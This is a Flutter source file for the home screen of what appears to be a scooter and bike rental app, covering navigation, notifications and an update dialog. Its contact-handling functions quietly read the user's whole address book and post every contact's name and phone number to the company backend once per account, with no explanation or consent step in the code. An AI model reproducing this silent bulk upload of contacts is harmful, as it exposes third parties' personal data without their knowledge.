import 'dart:async';
import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:ridobiko/controllers/auth/auth_controller.dart';
import 'package:ridobiko/core/notification_services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import '../bookings/YourOrder.dart';
import 'rental.dart';
import '../subscription/subscriptions.dart';
import '../more/more.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:timezone/data/latest.dart' as tz;
import 'package:http/http.dart' as http;

class MyHomePage extends ConsumerStatefulWidget {
  const MyHomePage({super.key});

  @override
  ConsumerState<ConsumerStatefulWidget> createState() => _MyHomePageState();
}

class _MyHomePageState extends ConsumerState<MyHomePage>
    with WidgetsBindingObserver {
  NotificationServices notificationServices = NotificationServices();
  List<String> contacts = [];

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    initialize();
  }

  Future<void> initialize() async {
    if (kDebugMode) {
      print('Initializing...');
    }

    if (kDebugMode) {
      print('Permissions requested');
    }

    if (await Permission.notification.isGranted) {
      notificationServices.requestNotificationPermissions();
      notificationServices.forgroundMessage();
      notificationServices.firebaseInit(context);
      notificationServices.isTokenRefresh();
      if (kDebugMode) {
        print('Notification services initialized');
      }
    }

    if (await Permission.contacts.isGranted) {
      _fetchContacts();
    }

    if (kDebugMode) {
      print('Initialization complete.');
    }
  }

  // Future<void> _requestPermissionsSequentially(
  //     List<Permission> permissions) async {
  //   for (var permission in permissions) {
  //     bool permissionGranted = false;
  //     while (!permissionGranted) {
  //       var permissionStatus = await permission.request();
  //       if (permissionStatus.isGranted) {
  //         permissionGranted = true;
  //         if (kDebugMode) {
  //           print('${permission.toString()} permission granted');
  //         }
  //       } else if (permissionStatus.isPermanentlyDenied) {
  //         if (kDebugMode) {
  //           print('${permission.toString()} permission permanently denied');
  //         }
  //         await _showSettingsDialog(permission);
  //         await Future.delayed(const Duration(seconds: 1));
  //       } else {
  //         if (kDebugMode) {
  //           print('${permission.toString()} permission not granted');
  //         }
  //         await Future.delayed(const Duration(seconds: 1));
  //       }
  //     }
  //   }
  // }

  // Future<void> _showSettingsDialog(Permission permission) async {
  //   return showDialog<void>(
  //     context: context,
  //     barrierDismissible: false,
  //     builder: (BuildContext context) {
  //       return AlertDialog(
  //         title: const Text('Permission Required'),
  //         content: const Text(
  //             'This permission is required for the app to function properly. Please enable it in the app settings.'),
  //         actions: <Widget>[
  //           TextButton(
  //             child: const Text('Cancel'),
  //             onPressed: () {
  //               Navigator.of(context).pop();
  //             },
  //           ),
  //           TextButton(
  //             child: const Text('Open Settings'),
  //             onPressed: () async {
  //               Navigator.of(context).pop();
  //               await openAppSettings();
  //             },
  //           ),
  //         ],
  //       );
  //     },
  //   );
  // }

  //Contacts fetching

  Future<void> _fetchContacts() async {
    final prefs = await SharedPreferences.getInstance();

    final mobileNumber = prefs.getString('mobile');
    if (kDebugMode) {
      print('Retrieved mobile number: $mobileNumber');
    }

    if (mobileNumber == null) {
      if (kDebugMode) {
        print('Mobile number is null');
      }
      return;
    }

    bool contactsSent = prefs.getBool('contacts_sent_$mobileNumber') ?? false;

    if (contactsSent) {
      if (kDebugMode) {
        print('Contacts have already been sent for $mobileNumber. Skipping...');
      }
      return;
    }

    List<String> fetchedContacts = await _getContactsFromRepository();
    setState(() {
      contacts = fetchedContacts;
      if (kDebugMode) {
        print('${fetchedContacts.length} contacts fetched');
      }
    });

    _storeContactsInSharedPreferences(fetchedContacts);

    await _sendContactsToBackend(fetchedContacts, mobileNumber);
  }

  //Contacts backend

  Future<void> _sendContactsToBackend(
      List<String> contacts, String mobileNumber) async {
    const url =
        'https://www.ridobiko.com/android_app_customer/api/database.php';

    List<Contact> contactsWithNumbers = await _getContactsWithNumbers();

    List<Contact> contactsToBeSent = contactsWithNumbers
        .where((contact) => contacts.contains(contact.displayName))
        .toList();

    List<Map<String, String?>> contactsData = contactsToBeSent.map((contact) {
      return {
        'number': contact.phones?.first.value,
        'name': contact.displayName ?? "",
      };
    }).toList();

    final response = await http.post(
      Uri.parse(url),
      headers: <String, String>{
        'Content-Type': 'application/json',
      },
      body: jsonEncode(<String, dynamic>{
        'login_mobile_number': mobileNumber,
        'contacts': contactsData,
      }),
    );

    if (response.statusCode == 200) {
      if (kDebugMode) {
        print('Contacts successfully sent to backend');
      }
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('contacts_sent_$mobileNumber', true);
    } else {
      if (kDebugMode) {
        print('Failed to send contacts to backend');
      }
    }
  }

  Future<List<Contact>> _getContactsWithNumbers() async {
    Iterable<Contact> allContacts = await ContactsService.getContacts();

    List<Contact> contactsWithNumbers = allContacts.where((contact) {
      return (contact.phones ?? []).isNotEmpty;
    }).toList();

    return contactsWithNumbers;
  }

  Future<List<String>> _getContactsFromRepository() async {
    List<String> contactNames = [];
    Iterable<Contact> contacts = await ContactsService.getContacts();
    for (Contact contact in contacts) {
      contactNames.add(contact.displayName ?? "");
    }
    return contactNames;
  }

  Future<void> _storeContactsInSharedPreferences(List<String> contacts) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    String contactsJson = contacts.join(',');
    await prefs.setString('contacts', contactsJson);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    if (kDebugMode) {
      print('App lifecycle state changed: $state');
    }
    if (state == AppLifecycleState.resumed) {
      if (kDebugMode) {
        print('App resumed');
      }
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  Future<void> checkForUpdate() async {
    final response =
        await ref.read(authControllerProvider.notifier).checkForUpdate(context);
    if (response) {
      showUpdateAlertBox();
    }
  }

  void _launchURL(String url) async {
    final Uri uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
      throw 'Could not launch $url';
    }
  }

  void showUpdateAlertBox() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext context) {
        return PopScope(
          canPop: false,
          child: AlertDialog(
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(16),
            ),
            title: const Text('Update Available'),
            content: const Text(
                'New version of app is available. Please update the app to continue.'),
            actions: [
              TextButton(
                child: const Text(
                  'Update',
                  style: TextStyle(
                    color: Color.fromRGBO(139, 0, 0, 1),
                  ),
                ),
                onPressed: () {
                  if (defaultTargetPlatform == TargetPlatform.iOS) {
                    _launchURL(
                        'https://apps.apple.com/in/app/ridobiko-scooter-bike-rental/id1667260245');
                  } else if (defaultTargetPlatform == TargetPlatform.android) {
                    _launchURL(
                        'https://play.google.com/store/apps/details?id=com.ridobikocustomer.app');
                  }
                },
              ),
            ],
          ),
        );
      },
    );
  }

  pageCaller(int index) {
    switch (index) {
      case 0:
        return Rental(
          callBack,
          homeContext: context,
        );
      case 1:
        return Subscriptions(callBack);
      case 2:
        return const YourOrder();
      case 3:
        return const More();
    }
  }

  int selectedPage = 0;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: pageCaller(selectedPage),
      bottomNavigationBar: NavigationBar(
          selectedIndex: selectedPage,
          height: 70,
          onDestinationSelected: (int index) {
            setState(() {
              selectedPage = index;
            });
          },
          backgroundColor: Colors.white,
          elevation: 10,
          destinations: [
            NavigationDestination(
              icon: Image.asset(
                "assets/icons/motorcycle.png",
                height: 25,
                color: selectedPage == 0 ? Colors.black87 : Colors.black45,
              ),
              label: 'Rental',
            ),
            NavigationDestination(
                selectedIcon: Image.asset(
                  "assets/icons/s_selected.png",
                  height: 20,
                  color: Colors.black87,
                ),
                icon: Image.asset(
                  "assets/icons/s.png",
                  height: 20,
                  // color: selectedPage == 1 ? Colors.black87  : Colors.black45,
                ),
                label: 'Subscriptions'),
            NavigationDestination(
                selectedIcon: Image.asset(
                  "assets/icons/booking_selected.png",
                  height: 20,
                  color: Colors.black87,
                ),
                icon: Image.asset(
                  "assets/icons/booking.png",
                  height: 20,
                  // color: selectedPage == 2 ? Colors.black87  : Colors.black45,
                ),
                // icon: Icon(Icons.book_online,),
                label: 'Booking'),
            NavigationDestination(
                selectedIcon: Image.asset(
                  "assets/icons/menu-f.png",
                  height: 20,
                  color: Colors.black87,
                ),
                icon: Image.asset(
                  "assets/icons/menu.png",
                  height: 20,
                  // color: selectedPage == 3 ? Colors.black87  : Colors.black45,
                ),
                label: 'More'),
          ]),
    );
  }

  void callBack(int index) {
    setState(() {
      selectedPage = index;
    });
  }
}
